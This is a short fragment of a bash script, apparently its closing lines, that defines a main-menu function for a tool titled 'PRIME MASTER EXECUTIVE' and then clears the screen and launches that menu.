run_main_menu()        { run_dynamic_menu "MAIN" "PRIME MASTER EXECUTIVE v$CURRENT_VERSION"; }

# --- ТОЧКА ЗАПУСКА ---
clear
run_main_menu

